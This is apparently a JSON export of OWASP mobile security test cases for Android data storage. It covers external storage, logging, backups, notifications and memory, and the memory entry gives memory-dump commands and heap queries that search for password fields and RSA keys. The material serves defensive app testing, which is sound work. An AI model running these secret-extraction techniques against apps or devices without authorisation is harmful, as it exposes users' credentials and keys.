[
    {
        "tags":
        [
            "MASTG-TEST-0200: Files Written to External Storage"
        ],
        "testcase": "Files Written to External Storage",
        "details": "<h2>Overview</h2><p>The goal of this test is to retrieve the files written to the external storage (<em><a href=\"https://mas.owasp.org/MASTG-KNOW-0042\" rel=\"noopener noreferrer\" target=\"_blank\"> External Storage</a></em>) and inspect them regardless of the APIs used to write them. It uses a simple approach based on file retrieval from the device storage (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0002\" rel=\"noopener noreferrer\" target=\"_blank\"> Host-Device Data Transfer</a></em>) before and after the app is exercised to identify the files created during the app's execution and to check if they contain sensitive data.</p><h2></h2><h2>Steps</h2><ol><li>Make sure you have <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0004\" rel=\"noopener noreferrer\" target=\"_blank\"> adb</a></em> installed.</li><li>Install the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0005\" rel=\"noopener noreferrer\" target=\"_blank\"> Installing Apps</a></em>).</li><li>Before running the app, get the current list of files (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0002\" rel=\"noopener noreferrer\" target=\"_blank\"> Host-Device Data Transfer</a></em>) in the external storage.</li><li>Exercise the app.</li><li>After running the app, retrieve the list of files in the external storage again.</li><li>Calculate the difference between the two lists.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of files that were created on the external storage during the app's execution.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if the files found above are not encrypted and leak sensitive data.</p><p>To confirm this, you can reverse engineer the app(<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>) and inspect the code(<em><a href=\"https://mas.owasp.org/MASTG-TECH-0023\" rel=\"noopener noreferrer\" target=\"_blank\"> Reviewing Decompiled Java Code</a></em>).</p>",
        "code": "MASTG-TEST-0200",
        "sort_order": 4
    },
    {
        "tags":
        [
            "MASTG-TEST-0004: Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services"
        ],
        "testcase": "Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services",
        "details": "<h2>Overview</h2><h2></h2><h2>Static Analysis</h2><p>To determine whether API calls and functions provided by the third-party library are used according to best practices, review their source code, requested permissions and check for any known vulnerabilities.</p><p>All data that's sent to third-party services should be anonymized to prevent exposure of PII (Personal Identifiable Information) that would allow the third party to identify the user account. No other data (such as IDs that can be mapped to a user account or session) should be sent to a third party.</p><h2></h2><h2>Dynamic Analysis</h2><p>Check all requests to external services for embedded sensitive information. To intercept traffic between the client and server, you can perform dynamic analysis by launching a <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">Machine-in-the-Middle (MITM)</a> attack with <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0077\" rel=\"noopener noreferrer\" target=\"_blank\"> Burp Suite</a></em> or <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0079\" rel=\"noopener noreferrer\" target=\"_blank\"> ZAP</a></em>. Once you route the traffic through the interception proxy, you can try to sniff the traffic that passes between the app and server. All app requests that aren't sent directly to the server on which the main function is hosted should be checked for sensitive information, such as PII in a tracker or ad service.</p>",
        "code": "MASTG-TEST-0004",
        "sort_order": 1
    },
    {
        "tags":
        [
            "MASTG-TEST-0202: References to APIs and Permissions for Accessing External Storage"
        ],
        "testcase": "References to APIs and Permissions for Accessing External Storage",
        "details": "<h2>Overview</h2><p>This test uses static analysis to look for uses of APIs allowing an app to write to locations that are shared with other apps (<em><a href=\"https://mas.owasp.org/MASTG-TEST-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing Local Storage for Sensitive Data</a></em>) such as the <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#external-storage-apis\" rel=\"noopener noreferrer\" target=\"_blank\">external storage APIs</a> or the <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#mediastore-api\" rel=\"noopener noreferrer\" target=\"_blank\">MediaStore API</a> as well as the relevant <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#manifest-permissions\" rel=\"noopener noreferrer\" target=\"_blank\">Android manifest storage-related permissions</a>.</p><p>This static test is great for identifying all code locations where the app is writing data to shared storage. However, it does not provide the actual data being written, and in some cases, the actual path in the device storage where the data is being written. Therefore, it is recommended to combine this test with others that take a dynamic approach, as this will provide a more complete view of the data being written to shared storage.</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool on the reverse engineered app targeting calls to any external storage APIs and Android manifest storage permissions.</li></ol><p>The static analysis tool should be able to identify all possible APIs and permissions used to write to shared storage, such as getExternalStoragePublicDirectory, getExternalStorageDirectory, getExternalFilesDir, MediaStore, WRITE_EXTERNAL_STORAGE, and MANAGE_EXTERNAL_STORAGE. See the <a href=\"https://developer.android.com/training/data-storage/shared\" rel=\"noopener noreferrer\" target=\"_blank\">Android documentation ↗</a> for more information on these APIs and permissions.</p><h2></h2><h2>Observation</h2><p>The output should contain a list of APIs and storage-related permissions used to write to shared storage and their code locations.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if:</p><ul><li>the app has the proper permissions declared in the Android manifest (e.g. WRITE_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, etc.)</li><li><strong>and</strong> the data being written to shared storage is sensitive and not encrypted.</li></ul><p>To determine the latter, you may need to carefully review the reversed code (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0023\" rel=\"noopener noreferrer\" target=\"_blank\"> Reviewing Decompiled Java Code</a></em>) and/or combine this test with others that take a dynamic approach, as this will provide a more complete view of the data being written to shared storage.</p><h2></h2><h2>References</h2><ul><li><a href=\"https://developer.android.com/training/data-storage/manage-all-files\" rel=\"noopener noreferrer\" target=\"_blank\">Manage all files on a storage device ↗</a></li><li><a href=\"https://developer.android.com/training/data-storage/shared/media\" rel=\"noopener noreferrer\" target=\"_blank\">Access media files from shared storage ↗</a></li></ul>",
        "code": "MASTG-TEST-0202",
        "sort_order": 6
    },
    {
        "tags":
        [
            "MASTG-TEST-0203: Runtime Use of Logging APIs"
        ],
        "testcase": "Runtime Use of Logging APIs",
        "details": "<h2>Overview</h2><p>On Android platforms, <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#logs\" rel=\"noopener noreferrer\" target=\"_blank\">logging APIs</a> like Log, Logger, System.out.print, System.err.print, and java.lang.Throwable#printStackTrace can inadvertently lead to the leakage of sensitive information. Log messages are recorded in logcat, a shared memory buffer, accessible since Android 4.1 (API level 16) only to privileged system applications that declare the READ_LOGS permission. Nonetheless, the vast ecosystem of Android devices includes pre-loaded apps with the READ_LOGS privilege, increasing the risk of sensitive data exposure. Therefore, direct logging to logcat is generally advised against due to its susceptibility to data leaks.</p><h2></h2><h2>Steps</h2><ol><li>Install and run the app.</li><li>Navigate to the screen of the mobile app you want to analyse the log output from.</li><li>Execute a method trace (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0033\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Tracing</a></em>) (using e.g. <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for Android</a></em>) by attaching to the running app, targeting logging APIs and save the output.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where logging APIs are used in the app for the current execution.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find sensitive data being logged using those APIs.</p><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0002\" rel=\"noopener noreferrer\" target=\"_blank\"> Remove Logging Code</a></em></li></ul>",
        "code": "MASTG-TEST-0203",
        "sort_order": 7
    },
    {
        "tags":
        [
            "MASTG-TEST-0207: Data Stored in the App Sandbox at Runtime"
        ],
        "testcase": "Data Stored in the App Sandbox at Runtime",
        "details": "<h2>Overview</h2><p>The goal of this test is to retrieve the files written to the <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#internal-storage\" rel=\"noopener noreferrer\" target=\"_blank\">internal storage</a> and inspect them regardless of the APIs used to write them. It uses a simple approach based on file retrieval from the device storage (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0002\" rel=\"noopener noreferrer\" target=\"_blank\"> Host-Device Data Transfer</a></em>) before and after the app is exercised to identify the files created during the app's execution and to check if they contain sensitive data.</p><h2></h2><h2>Steps</h2><ol><li>Start the device.</li><li>Take a first copy of the app's private data directory (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0008\" rel=\"noopener noreferrer\" target=\"_blank\"> Accessing App Data Directories</a></em>) to have as a reference for offline analysis. You can use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0004\" rel=\"noopener noreferrer\" target=\"_blank\"> adb</a></em> for example.</li><li>Launch and use the app going through the various workflows while inputting sensitive data wherever you can. Taking note of the data you input can help identify it later using tools to search for it.</li><li>Take a second copy of the app's private data directory for offline analysis and make a diff using the first copy to identify all files created or modify during your testing session.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of files that were created in the app's private storage during execution.</p><h2></h2><h2>Evaluation</h2><p>Attempt to identify and decode data that has been encoded using methods such as base64 encoding, hexadecimal representation, URL encoding, escape sequences, wide characters and common data obfuscation methods such as xoring. Also consider identifying and decompressing compressed files such as tar or zip. These methods obscure but do not protect sensitive data.</p><p>Search the extracted data for items such as keys, passwords and any sensitive data inputted into the app. The test case fails if you find any of this sensitive data.</p>",
        "code": "MASTG-TEST-0207",
        "sort_order": 8
    },
    {
        "tags":
        [
            "MASTG-TEST-0231: References to Logging APIs"
        ],
        "testcase": "References to Logging APIs",
        "details": "<h2>Overview</h2><p>This test verifies if an app uses <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#logs\" rel=\"noopener noreferrer\" target=\"_blank\">logging APIs</a> like android.util.Log, Log, Logger, System.out.print, System.err.print, and java.lang.Throwable#printStackTrace.</p><h2></h2><h2>Steps</h2><ol><li>Use either <em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em> with a tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0110\" rel=\"noopener noreferrer\" target=\"_blank\"> semgrep</a></em> to identify all logging APIs.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where logging APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if an app logs sensitive information from any of the listed locations.</p>",
        "code": "MASTG-TEST-0231",
        "sort_order": 10
    },
    {
        "tags":
        [
            "MASTG-TEST-0005: Determining Whether Sensitive Data Is Shared with Third Parties via Notifications"
        ],
        "testcase": "Determining Whether Sensitive Data Is Shared with Third Parties via Notifications",
        "details": "<h2>Overview</h2><h2></h2><h2>Static Analysis</h2><p>Search for any usage of the NotificationManager class which might be an indication of some form of notification management. If the class is being used, the next step would be to understand how the application is <a href=\"https://developer.android.com/training/notify-user/build-notification#SimpleNotification\" rel=\"noopener noreferrer\" target=\"_blank\">generating the notifications ↗</a> and which data ends up being shown.</p><h2></h2><h2>Dynamic Analysis</h2><p>Run the application and start tracing all calls to functions related to the notifications creation, e.g. setContentTitle or setContentText from <a href=\"https://developer.android.com/reference/androidx/core/app/NotificationCompat.Builder\" rel=\"noopener noreferrer\" target=\"_blank\">NotificationCompat.Builder ↗</a>. Observe the trace in the end and evaluate if it contains any sensitive information which another app might have eavesdropped.</p>",
        "code": "MASTG-TEST-0005",
        "sort_order": 2
    },
    {
        "tags":
        [
            "MASTG-TEST-0201: Runtime Use of APIs to Access External Storage"
        ],
        "testcase": "Runtime Use of APIs to Access External Storage",
        "details": "<h2>Overview</h2><p>Android apps use a variety of <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#external-storage-apis\" rel=\"noopener noreferrer\" target=\"_blank\">APIs to access the external storage</a>. Collecting a comprehensive list of these APIs can be challenging, especially if an app uses a third-party framework, loads code at runtime, or includes native code. The most effective approach to testing applications that write to device storage is usually dynamic analysis, and specifically method tracing (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0033\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Tracing</a></em>).</p><h2></h2><h2>Steps</h2><ol><li>Make sure you have <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for Android</a></em> installed.</li><li>Install the app.</li><li>Execute a script to spawn the app with Frida and log all interactions with files.</li><li>Navigate to the screen of the app that you want to analyse.</li><li>Close the app to stop Frida.</li></ol><p>The Frida script should log all file interactions by hooking into the relevant APIs such as getExternalStorageDirectory, getExternalStoragePublicDirectory, getExternalFilesDir or FileOutPutStream. You could also use open as a catch-all for file interactions. However, this won't catch all file interactions, such as those that use the MediaStore API and should be done with additional filtering as it can generate a lot of noise.</p><h2></h2><h2>Observation</h2><p>The output should contain a list of files that the app wrote to the external storage during execution and, if possible, the APIs used to write them.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if the files found above are not encrypted and leak sensitive data.</p><p>To confirm this, you can manually inspect the files using adb shell (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0002\" rel=\"noopener noreferrer\" target=\"_blank\"> Host-Device Data Transfer</a></em>) to retrieve them from the device, and reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>) and inspect the code (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0023\" rel=\"noopener noreferrer\" target=\"_blank\"> Reviewing Decompiled Java Code</a></em>).</p>",
        "code": "MASTG-TEST-0201",
        "sort_order": 5
    },
    {
        "tags":
        [
            "MASTG-TEST-0011: Testing Memory for Sensitive Data"
        ],
        "testcase": "Testing Memory for Sensitive Data",
        "details": "<h2>Overview</h2><p>Analyzing memory can help developers identify the root causes of several problems, such as application crashes. However, it can also be used to access sensitive data. This section describes how to check for data disclosure via process memory.</p><p>First identify sensitive information that is stored in memory. Sensitive assets have likely been loaded into memory at some point. The objective is to verify that this information is exposed as briefly as possible.</p><p>To investigate an application's memory, you must first create a memory dump. You can also analyze the memory in real-time, e.g., via a debugger. Regardless of your approach, memory dumping is a very error-prone process in terms of verification because each dump contains the output of executed functions. You may miss executing critical scenarios. In addition, overlooking data during analysis is probable unless you know the data's footprint (either the exact value or the data format). For example, if the app encrypts with a randomly generated symmetric key, you likely won't be able to spot it in memory unless you can recognize the key's value in another context.</p><p>Therefore, you are better off starting with static analysis.</p><h2></h2><h2>Static Analysis</h2><p>When performing static analysis to identify sensitive data that is exposed in memory, you should:</p><ul><li>Try to identify application components and map where data is used.</li><li>Make sure that sensitive data is handled by as few components as possible.</li><li>Make sure that object references are properly removed once the object containing the sensitive data is no longer needed.</li><li>Make sure that garbage collection is requested after references have been removed.</li><li>Make sure that sensitive data gets overwritten as soon as it is no longer needed.<ul><li>Don't represent such data with immutable data types (such as String and BigInteger).</li><li>Avoid non-primitive data types (such as StringBuilder).</li><li>Overwrite references before removing them, outside the finalize method.</li><li>Pay attention to third-party components (libraries and frameworks). Public APIs are good indicators. Determine whether the public API handles the sensitive data as described in this chapter.</li></ul></li></ul><p><strong>The following section describes pitfalls of data leakage in memory and best practices for avoiding them.</strong></p><p>Don't use immutable structures (e.g., String and BigInteger) to represent secrets. Nullifying these structures will be ineffective: the garbage collector may collect them, but they may remain on the heap after garbage collection. Nevertheless, you should ask for garbage collection after every critical operation (e.g., encryption, parsing server responses that contain sensitive information). When copies of the information have not been properly cleaned (as explained below), your request will help reduce the length of time for which these copies are available in memory.</p><p>To properly clean sensitive information from memory, store it in primitive data types, such as byte-arrays (byte[]) and char-arrays (char[]). You should avoid storing the information in mutable non-primitive data types.</p><p>Make sure to overwrite the content of the critical object once the object is no longer needed. Overwriting the content with zeroes is one simple and very popular method:</p><p>Example in Java:</p><pre>byte[] secret = null;\ntry{\n    //get or generate the secret, do work with it, make sure you make no local copies\n} finally {\n    if (null != secret) {\n        Arrays.fill(secret, (byte) 0);\n    }\n}\n</pre><p>Example in Kotlin:</p><pre>val secret: ByteArray? = null\ntry {\n     //get or generate the secret, do work with it, make sure you make no local copies\n} finally {\n    if (null != secret) {\n        Arrays.fill(secret, 0.toByte())\n    }\n}\n</pre><p>This doesn't, however, guarantee that the content will be overwritten at runtime. To optimize the bytecode, the compiler will analyze and decide not to overwrite data because it will not be used afterwards (i.e., it is an unnecessary operation). Even if the code is in the compiled DEX, the optimization may occur during the just-in-time or ahead-of-time compilation in the VM.</p><p>There is no silver bullet for this problem because different solutions have different consequences. For example, you may perform additional calculations (e.g., XOR the data into a dummy buffer), but you'll have no way to know the extent of the compiler's optimization analysis. On the other hand, using the overwritten data outside the compiler's scope (e.g., serializing it in a temp file) guarantees that it will be overwritten but obviously impacts performance and maintenance.</p><p>Then, using Arrays.fill to overwrite the data is a bad idea because the method is an obvious hooking target (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0043\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Hooking</a></em> for more details).</p><p>The final issue with the above example is that the content was overwritten with zeroes only. You should try to overwrite critical objects with random data or content from non-critical objects. This will make it really difficult to construct scanners that can identify sensitive data on the basis of its management.</p><p>Below is an improved version of the previous example:</p><p>Example in Java:</p><pre>byte[] nonSecret = somePublicString.getBytes(\"ISO-8859-1\");\nbyte[] secret = null;\ntry{\n    //get or generate the secret, do work with it, make sure you make no local copies\n} finally {\n    if (null != secret) {\n        for (int i = 0; i &lt; secret.length; i++) {\n            secret[i] = nonSecret[i % nonSecret.length];\n        }\n\n        FileOutputStream out = new FileOutputStream(\"/dev/null\");\n        out.write(secret);\n        out.flush();\n        out.close();\n    }\n}\n</pre><p>Example in Kotlin:</p><pre>val nonSecret: ByteArray = somePublicString.getBytes(\"ISO-8859-1\")\nval secret: ByteArray? = null\ntry {\n     //get or generate the secret, do work with it, make sure you make no local copies\n} finally {\n    if (null != secret) {\n        for (i in secret.indices) {\n            secret[i] = nonSecret[i % nonSecret.size]\n        }\n\n        val out = FileOutputStream(\"/dev/null\")\n        out.write(secret)\n        out.flush()\n        out.close()\n        }\n}\n</pre><p>For more information, take a look at <a href=\"https://github.com/nowsecure/secure-mobile-development/blob/master/en/coding-practices/securely-store-sensitive-data-in-ram.md\" rel=\"noopener noreferrer\" target=\"_blank\">Securely Storing Sensitive Data in RAM</a>.</p><p>In the \"Static Analysis\" section, we mentioned the proper way to handle cryptographic keys when you are using AndroidKeyStore or SecretKey.</p><p>For a better implementation of SecretKey, look at the SecureSecretKey class below. Although the implementation is probably missing some boilerplate code that would make the class compatible with SecretKey, it addresses the main security concerns:</p><ul><li>No cross-context handling of sensitive data. Each copy of the key can be cleared from within the scope in which it was created.</li><li>The local copy is cleared according to the recommendations given above.</li></ul><p>Example in Java:</p><pre>  public class SecureSecretKey implements javax.crypto.SecretKey, Destroyable {\n      private byte[] key;\n      private final String algorithm;\n\n      /** Constructs SecureSecretKey instance out of a copy of the provided key bytes.\n        * The caller is responsible of clearing the key array provided as input.\n        * The internal copy of the key can be cleared by calling the destroy() method.\n        */\n      public SecureSecretKey(final byte[] key, final String algorithm) {\n          this.key = key.clone();\n          this.algorithm = algorithm;\n      }\n\n      public String getAlgorithm() {\n          return this.algorithm;\n      }\n\n      public String getFormat() {\n          return \"RAW\";\n      }\n\n      /** Returns a copy of the key.\n        * Make sure to clear the returned byte array when no longer needed.\n        */\n      public byte[] getEncoded() {\n          if(null == key){\n              throw new NullPointerException();\n          }\n\n          return key.clone();\n      }\n\n      /** Overwrites the key with dummy data to ensure this copy is no longer present in memory.*/\n      public void destroy() {\n          if (isDestroyed()) {\n              return;\n          }\n\n          byte[] nonSecret = new String(\"RuntimeException\").getBytes(\"ISO-8859-1\");\n          for (int i = 0; i &lt; key.length; i++) {\n            key[i] = nonSecret[i % nonSecret.length];\n          }\n\n          FileOutputStream out = new FileOutputStream(\"/dev/null\");\n          out.write(key);\n          out.flush();\n          out.close();\n\n          this.key = null;\n          System.gc();\n      }\n\n      public boolean isDestroyed() {\n          return key == null;\n      }\n  }\n</pre><p>Example in Kotlin:</p><pre>class SecureSecretKey(key: ByteArray, algorithm: String) : SecretKey, Destroyable {\n    private var key: ByteArray?\n    private val algorithm: String\n    override fun getAlgorithm(): String {\n        return algorithm\n    }\n\n    override fun getFormat(): String {\n        return \"RAW\"\n    }\n\n    /** Returns a copy of the key.\n     * Make sure to clear the returned byte array when no longer needed.\n     */\n    override fun getEncoded(): ByteArray {\n        if (null == key) {\n            throw NullPointerException()\n        }\n        return key!!.clone()\n    }\n\n    /** Overwrites the key with dummy data to ensure this copy is no longer present in memory. */\n    override fun destroy() {\n        if (isDestroyed) {\n            return\n        }\n        val nonSecret: ByteArray = String(\"RuntimeException\").toByteArray(charset(\"ISO-8859-1\"))\n        for (i in key!!.indices) {\n            key!![i] = nonSecret[i % nonSecret.size]\n        }\n        val out = FileOutputStream(\"/dev/null\")\n        out.write(key)\n        out.flush()\n        out.close()\n        key = null\n        System.gc()\n    }\n\n    override fun isDestroyed(): Boolean {\n        return key == null\n    }\n\n    /** Constructs SecureSecretKey instance out of a copy of the provided key bytes.\n     * The caller is responsible of clearing the key array provided as input.\n     * The internal copy of the key can be cleared by calling the destroy() method.\n     */\n    init {\n        this.key = key.clone()\n        this.algorithm = algorithm\n    }\n}\n</pre><p>Secure user-provided data is the final secure information type usually found in memory. This is often managed by implementing a custom input method, for which you should follow the recommendations given here. However, Android allows information to be partially erased from EditText buffers via a custom Editable.Factory.</p><pre>EditText editText = ...; //  point your variable to your EditText instance\nEditText.setEditableFactory(new Editable.Factory() {\n  public Editable newEditable(CharSequence source) {\n  ... // return a new instance of a secure implementation of Editable.\n  }\n});\n</pre><p>Refer to the SecureSecretKey example above for an example Editable implementation. Note that you will be able to securely handle all copies made by editText.getText if you provide your factory. You can also try to overwrite the internal EditText buffer by calling editText.setText, but there is no guarantee that the buffer will not have been copied already. If you choose to rely on the default input method and EditText, you will have no control over the keyboard or other components that are used. Therefore, you should use this approach for semi-confidential information only.</p><p>In all cases, make sure that sensitive data in memory is cleared when a user signs out of the application. Finally, make sure that highly sensitive information is cleared out the moment an Activity or Fragment's onPause event is triggered.</p><p>Note that this might mean that a user has to re-authenticate every time the application resumes.</p><h2>Dynamic Analysis</h2><p>Static analysis will help you identify potential problems, but it can't provide statistics about how long data has been exposed in memory, nor can it help you identify problems in closed-source dependencies. This is where dynamic analysis comes into play.</p><p>There are various ways to analyze the memory of a process, e.g. live analysis via a debugger/dynamic instrumentation and analyzing one or more memory dumps.</p><h3>Retrieving and Analyzing a Memory Dump</h3><p>Whether you are using a rooted or a non-rooted device, you can dump the app's process memory with <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0038\" rel=\"noopener noreferrer\" target=\"_blank\"> objection</a></em> and <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0106\" rel=\"noopener noreferrer\" target=\"_blank\"> Fridump</a></em>. You can find a detailed explanation of this process in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0044\" rel=\"noopener noreferrer\" target=\"_blank\"> Process Exploration</a></em>, in the chapter \"Tampering and Reverse Engineering on Android\".</p><p>After the memory has been dumped (e.g. to a file called \"memory\"), depending on the nature of the data you're looking for, you'll need a set of different tools to process and analyze that memory dump. For instance, if you're focusing on strings, it might be sufficient for you to execute the command strings or rabin2 -zz from <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em> to extract those strings.</p><pre># using strings\n$ strings memory &gt; strings.txt\n\n# using rabin2\n$ rabin2 -ZZ memory &gt; strings.txt\n</pre><p>Open strings.txt in your favorite editor and dig through it to identify sensitive information.</p><p>However if you'd like to inspect other kind of data, you'd rather want to use radare2 and its search capabilities. See radare2's help on the search command (/?) for more information and a list of options. The following shows only a subset of them:</p><pre>$ r2 &lt;name_of_your_dump_file&gt;\n\n[0x00000000]&gt; /?\nUsage: /[!bf] [arg]  Search stuff (see 'e??search' for options)\n|Use io.va for searching in non virtual addressing spaces\n| / foo\\x00                    search for string 'foo\\0'\n| /c[ar]                       search for crypto materials\n| /e /E.F/i                    match regular expression\n| /i foo                       search for string 'foo' ignoring case\n| /m[?][ebm] magicfile         search for magic, filesystems or binary headers\n| /v[1248] value               look for an `cfg.bigendian` 32bit value\n| /w foo                       search for wide string 'f\\0o\\0o\\0'\n| /x ff0033                    search for hex string\n| /z min max                   search for strings of given size\n...\n</pre><h3>Runtime Memory Analysis</h3><p>Instead of dumping the memory to your host computer, you can alternatively use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0036\" rel=\"noopener noreferrer\" target=\"_blank\"> r2frida</a></em>. With it, you can analyze and inspect the app's memory while it's running. For example, you may run the previous search commands from r2frida and search the memory for a string, hexadecimal values, etc. When doing so, remember to prepend the search command (and any other r2frida specific commands) with a backslash : after starting the session with r2 frida://usb//&lt;name_of_your_app&gt;.</p><p>For more information, options and approaches, please refer to <em><a href=\"https://mas.owasp.org/MASTG-TECH-0044\" rel=\"noopener noreferrer\" target=\"_blank\"> Process Exploration</a></em> for more information.</p><h3>Explicitly Dumping and Analyzing the Java Heap</h3><p>For rudimentary analysis, you can use Android Studio's built-in tools. They are on the <em>Android Monitor</em> tab. To dump memory, select the device and app you want to analyze and click <em>Dump Java Heap</em>. This will create a <em>.hprof</em> file in the <em>captures</em> directory, which is on the app's project path.</p><p>To navigate through class instances that were saved in the memory dump, select the Package Tree View in the tab showing the <em>.hprof</em> file.</p><p>For more advanced analysis of the memory dump, use the <a href=\"https://eclipse.org/mat/downloads.php\" rel=\"noopener noreferrer\" target=\"_blank\">Eclipse Memory Analyzer Tool (MAT) ↗</a>. It is available as an Eclipse plugin and as a standalone application.</p><p>To analyze the dump in MAT, use the <em>hprof-conv</em> platform tool, which comes with the Android SDK.</p><pre>./hprof-conv memory.hprof memory-mat.hprof\n</pre><p>MAT provides several tools for analyzing the memory dump. For example, the <em>Histogram</em> provides an estimate of the number of objects that have been captured from a given type, and the <em>Thread Overview</em> shows processes' threads and stack frames. The <em>Dominator Tree</em> provides information about keep-alive dependencies between objects. You can use regular expressions to filter the results these tools provide.</p><p><em>Object Query Language</em> studio is a MAT feature that allows you to query objects from the memory dump with an SQL-like language. The tool allows you to transform simple objects by invoking Java methods on them, and it provides an API for building sophisticated tools on top of the MAT.</p><pre>SELECT * FROM java.lang.String\n</pre><p>In the example above, all String objects present in the memory dump will be selected. The results will include the object's class, memory address, value, and retain count. To filter this information and see only the value of each string, use the following code:</p><pre>SELECT toString(object) FROM java.lang.String object\n</pre><p>Or</p><pre>SELECT object.toString() FROM java.lang.String object\n</pre><p>SQL supports primitive data types as well, so you can do something like the following to access the content of all char arrays:</p><pre>SELECT toString(arr) FROM char[] arr\n</pre><p>Don't be surprised if you get results that are similar to the previous results; after all, String and other Java data types are just wrappers around primitive data types. Now let's filter the results. The following sample code will select all byte arrays that contain the ASN.1 OID of an RSA key. This doesn't imply that a given byte array actually contains an RSA (the same byte sequence may be part of something else), but this is probable.</p><pre>SELECT * FROM byte[] b WHERE toString(b).matches(\".*1\\.2\\.840\\.113549\\.1\\.1\\.1.*\")\n</pre><p>Finally, you don't have to select whole objects. Consider an SQL analogy: classes are tables, objects are rows, and fields are columns. If you want to find all objects that have a \"password\" field, you can do something like the following:</p><pre>SELECT password FROM \".*\" WHERE (null != password)\n</pre><p>During your analysis, search for:</p><ul><li>Indicative field names: \"password\", \"pass\", \"pin\", \"secret\", \"private\", etc.</li><li>Indicative patterns (e.g., RSA footprints) in strings, char arrays, byte arrays, etc.</li><li>Known secrets (e.g., a credit card number that you've entered or an authentication token provided by the backend)</li><li>etc.</li></ul><p>Repeating tests and memory dumps will help you obtain statistics about the length of data exposure. Furthermore, observing the way a particular memory segment (e.g., a byte array) changes may lead you to some otherwise unrecognizable sensitive data (more on this in the \"Remediation\" section below).</p>",
        "code": "MASTG-TEST-0011",
        "sort_order": 3
    },
    {
        "tags":
        [
            "MASTG-TEST-0216: Sensitive Data Not Excluded From Backup"
        ],
        "testcase": "Sensitive Data Not Excluded From Backup",
        "details": "<h2>Overview</h2><p>This test verifies whether apps correctly instruct the system to exclude sensitive files from backups by performing a backup and restore of the app data and checking which files are restored.</p><p>See <em><a href=\"https://mas.owasp.org/MASTG-TEST-0262\" rel=\"noopener noreferrer\" target=\"_blank\"> References to Backup Configurations Not Excluding Sensitive Data</a></em> for a static analysis counterpart.</p><p>Android provides a way to start the backup daemon to back up and restore app files, which you can use to verify which files are actually restored from the backup.</p><h2></h2><h2>Steps</h2><ol><li>Start the device.</li><li>Install an app on your device.</li><li>Launch and use the app going through the various workflows while inputting sensitive data wherever you can.</li><li>Perform a backup and restore of the app data (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0128\" rel=\"noopener noreferrer\" target=\"_blank\"> Performing a Backup and Restore of App Data</a></em>).</li><li>Uninstall and reinstall the app but don't open it anymore.</li><li>Restore the data from the backup and get the list of restored files.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of files that are restored from the backup.</p><h2></h2><h2>Evaluation</h2><p>The test fails if any of the files are considered sensitive.</p><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0004\" rel=\"noopener noreferrer\" target=\"_blank\"> Exclude Sensitive Data from 